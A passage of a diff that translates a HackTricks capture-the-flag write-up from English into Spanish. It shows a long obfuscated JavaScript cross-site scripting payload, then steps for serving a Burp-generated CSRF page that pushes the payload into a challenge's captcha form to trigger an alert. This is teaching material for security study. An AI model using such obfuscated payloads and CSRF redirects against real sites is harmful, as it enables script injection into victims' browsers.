+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][[e+e][0][5]+e[e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][15]+[[][[]]+e][0][5]+[e+e][0][21]+[[][[]]+e][0][2]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]][[e+e][0][5]+[[]/e+e][0][1]+e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[e+e][0][6]+[e+e][0][5]+e[e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[[]/e+e][0][1]+[e+e][0][13]+[e+e][0][4]+[[][[]]+e][0][1]+[e+e][0][6]+[[]/e+e][0][0]+[e+e][0][1]+[[][[]]+e][0][2]+[e+e][0][4]][[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][15]+[[]/e+e][0][1]][[e+e][0][15]][[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][43]+e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][0]+[/e/+e][0][0]+[e+e][0][18]+[e+e][0][5]+[e+e][0][13]+[[][[]]+e][0][5]+e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][1]+[e+e][0][6]+e[[e+e][0][1]+[[][[]]+e][0][0]+[e+e][0][6]+[e+e][0][4]+[e+e][0][13]+[e+e][0][8]+[e+e][0][9]+[e+e][0][10]+[e+e][0][11]][62]]}`
 ```
-
-Then, you need to **generate a HTML page** that, when loaded, it’s going to **redirect** the victim to the **challenge** page **setting the exploit in the captcha form**. The following code can be use for this purpose (_note that the exploit is URL encoded_):
-
+Entonces, necesitas **generar una página HTML** que, al cargarse, va a **redirigir** a la víctima a la página del **desafío estableciendo el exploit en el formulario captcha**. El siguiente código se puede usar para este propósito (_nota que el exploit está codificado en URL_):
 ```markup
   <!-- CSRF PoC - generated by Burp Suite Professional -->
   <body>
@@ -174,12 +157,11 @@ Then, you need to **generate a HTML page** that, when loaded, it’s going to **
   </body>
 </html>
 ```
-
-Finally, **serve the poc in a HTTP** server and access it from the browser:\\
+Finalmente, **sirve el poc en un servidor HTTP** y accede a él desde el navegador:\\
 
 ![](https://i.imgur.com/qack7GO.png)
 
-Just press **submit** on the captcha form and the alert will be executed:
+Simplemente presiona **submit** en el formulario de captcha y se ejecutará la alerta:
 
 ![](https://i.imgur.com/mCORty3.png)
 
@@ -187,10 +169,10 @@ Just press **submit** on the captcha form and the alert will be executed:
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
